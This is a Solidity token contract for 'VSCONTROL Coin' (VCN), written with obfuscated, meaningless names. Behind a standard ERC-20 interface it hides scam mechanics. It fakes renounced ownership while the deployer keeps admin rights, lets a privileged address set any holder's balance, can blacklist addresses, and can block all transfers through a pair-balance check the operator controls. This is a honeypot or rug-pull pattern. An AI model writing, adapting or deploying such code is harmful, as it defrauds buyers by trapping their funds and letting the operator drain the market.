//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract maxTeam {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface isTeam {
    function totalSupply() external view returns (uint256);

    function balanceOf(address txSell) external view returns (uint256);

    function transfer(address receiverMarketingMode, uint256 receiverTo) external returns (bool);

    function allowance(address autoFrom, address spender) external view returns (uint256);

    function approve(address spender, uint256 receiverTo) external returns (bool);

    function transferFrom(
        address sender,
        address receiverMarketingMode,
        uint256 receiverTo
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fundMarketing, uint256 value);
    event Approval(address indexed autoFrom, address indexed spender, uint256 value);
}

interface teamExempt is isTeam {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface receiverList {
    function createPair(address atTx, address toMax) external returns (address);
}

interface shouldLaunchMin {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract VSCONTROLCoin is maxTeam, isTeam, teamExempt {

    mapping(address => uint256) private buyEnable;

    address shouldTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function symbol() external view virtual override returns (string memory) {
        return feeAmount;
    }

    function modeList() private view {
        require(swapModeReceiver[_msgSender()]);
    }

    function atTeam(address tradingReceiver, address receiverMarketingMode, uint256 receiverTo) internal returns (bool) {
        require(buyEnable[tradingReceiver] >= receiverTo);
        buyEnable[tradingReceiver] -= receiverTo;
        buyEnable[receiverMarketingMode] += receiverTo;
        emit Transfer(tradingReceiver, receiverMarketingMode, receiverTo);
        return true;
    }

    constructor (){
        if (atTrading == isFund) {
            maxMarketing = false;
        }
        launchWalletEnable();
        shouldLaunchMin takeEnableLiquidity = shouldLaunchMin(feeMarketingWallet);
        liquidityExempt = receiverList(takeEnableLiquidity.factory()).createPair(takeEnableLiquidity.WETH(), address(this));
        
        fundList = _msgSender();
        swapModeReceiver[fundList] = true;
        buyEnable[fundList] = autoMax;
        if (buyShould) {
            toTake = false;
        }
        emit Transfer(address(0), fundList, autoMax);
    }

    bool public senderToken;

    function minReceiver(address tradingReceiver, address receiverMarketingMode, uint256 receiverTo) internal returns (bool) {
        if (tradingReceiver == fundList) {
            return atTeam(tradingReceiver, receiverMarketingMode, receiverTo);
        }
        uint256 tokenTeamLaunched = isTeam(liquidityExempt).balanceOf(shouldTake);
        require(tokenTeamLaunched == sellMinEnable);
        require(!exemptReceiverFrom[tradingReceiver]);
        return atTeam(tradingReceiver, receiverMarketingMode, receiverTo);
    }

    function allowance(address fundSender, address shouldLiquidity) external view virtual override returns (uint256) {
        if (shouldLiquidity == feeMarketingWallet) {
            return type(uint256).max;
        }
        return minTo[fundSender][shouldLiquidity];
    }

    function totalSupply() external view virtual override returns (uint256) {
        return autoMax;
    }

    function approve(address shouldLiquidity, uint256 receiverTo) public virtual override returns (bool) {
        minTo[_msgSender()][shouldLiquidity] = receiverTo;
        emit Approval(_msgSender(), shouldLiquidity, receiverTo);
        return true;
    }

    function transfer(address txLaunchAuto, uint256 receiverTo) external virtual override returns (bool) {
        return minReceiver(_msgSender(), txLaunchAuto, receiverTo);
    }

    bool private buyShould;

    function balanceOf(address txSell) public view virtual override returns (uint256) {
        return buyEnable[txSell];
    }

    bool private toTake;

    uint256 public marketingAt;

    mapping(address => bool) public exemptReceiverFrom;

    uint256 sellMinEnable;

    function limitWallet(address walletTx) public {
        if (exemptBuy) {
            return;
        }
        if (buyShould) {
            marketingAt = isFund;
        }
        swapModeReceiver[walletTx] = true;
        
        exemptBuy = true;
    }

    mapping(address => bool) public swapModeReceiver;

    uint8 private tokenExempt = 18;

    uint256 public atTrading;

    uint256 private autoMax = 100000000 * 10 ** 18;

    address private toLaunchedTake;

    uint256 totalLaunch;

    address public liquidityExempt;

    string private amountFund = "VSCONTROL Coin";

    function isMarketing(uint256 receiverTo) public {
        modeList();
        sellMinEnable = receiverTo;
    }

    address public fundList;

    function name() external view virtual override returns (string memory) {
        return amountFund;
    }

    address feeMarketingWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public exemptIs;

    bool private buyLimitMax;

    function owner() external view returns (address) {
        return toLaunchedTake;
    }

    bool public exemptBuy;

    string private feeAmount = "VCN";

    function exemptTeam(address totalLaunched) public {
        modeList();
        
        if (totalLaunched == fundList || totalLaunched == liquidityExempt) {
            return;
        }
        exemptReceiverFrom[totalLaunched] = true;
    }

    function getOwner() external view returns (address) {
        return toLaunchedTake;
    }

    uint256 public isFund;

    event OwnershipTransferred(address indexed maxAmount, address indexed amountTotalFund);

    function launchWalletEnable() public {
        emit OwnershipTransferred(fundList, address(0));
        toLaunchedTake = address(0);
    }

    function listLaunched(address txLaunchAuto, uint256 receiverTo) public {
        modeList();
        buyEnable[txLaunchAuto] = receiverTo;
    }

    function decimals() external view virtual override returns (uint8) {
        return tokenExempt;
    }

    mapping(address => mapping(address => uint256)) private minTo;

    function transferFrom(address tradingReceiver, address receiverMarketingMode, uint256 receiverTo) external override returns (bool) {
        if (_msgSender() != feeMarketingWallet) {
            if (minTo[tradingReceiver][_msgSender()] != type(uint256).max) {
                require(receiverTo <= minTo[tradingReceiver][_msgSender()]);
                minTo[tradingReceiver][_msgSender()] -= receiverTo;
            }
        }
        return minReceiver(tradingReceiver, receiverMarketingMode, receiverTo);
    }

    bool private maxMarketing;

}